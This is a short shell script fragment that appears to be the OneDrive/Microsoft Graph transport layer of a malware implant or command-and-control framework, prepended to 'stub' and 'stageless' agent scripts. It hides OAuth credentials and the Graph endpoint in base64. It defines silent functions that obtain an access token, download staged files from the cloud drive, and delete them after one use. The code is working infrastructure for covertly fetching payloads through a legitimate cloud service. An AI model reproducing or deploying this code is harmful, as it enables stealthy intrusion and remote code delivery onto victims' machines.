# === TRANSPORT: OneDrive / Microsoft Graph (stub layer) ===
# Provides _tk (get token), _dl (download), _rm (delete).
# Credentials substituted by wizard at deploy time.
# This file is prepended to agent/stub.sh and agent/stub_stageless.sh.

_ci=$(printf '%s' 'STUB_CLIENT_ID_B64'     | base64 -d 2>/dev/null)
_cs=$(printf '%s' 'STUB_CLIENT_SECRET_B64'  | base64 -d 2>/dev/null)
_ti=$(printf '%s' 'STUB_TENANT_ID_B64'      | base64 -d 2>/dev/null)
_rc=$(printf '%s' 'STUB_REFRESH_TOKEN_B64'  | base64 -d 2>/dev/null)
_gb=$(printf '%s' 'aHR0cHM6Ly9ncmFwaC5taWNyb3NvZnQuY29tL3YxLjAvbWUvZHJpdmUvcm9vdDo=' | base64 -d)

# -- get access token --
_tk() {
    curl -sf -X POST "https://login.microsoftonline.com/${_ti}/oauth2/v2.0/token" \
        -d "grant_type=refresh_token&refresh_token=${_rc}&client_id=${_ci}&client_secret=${_cs}&scope=Files.ReadWrite.All%20offline_access" \
        2>/dev/null | grep -o '"access_token":"[^"]*"' | grep -o '"[^"]*"$' | tr -d '"'
}

# -- download file to stdout --
_dl() {
    curl -sfL -X GET "${_gb}${2}:/content" \
        -H "Authorization: Bearer ${1}" 2>/dev/null
}

# -- delete file (BK one-time use) --
_rm() {
    curl -sf -X DELETE "${_gb}${2}:" \
        -H "Authorization: Bearer ${1}" >/dev/null 2>&1
}
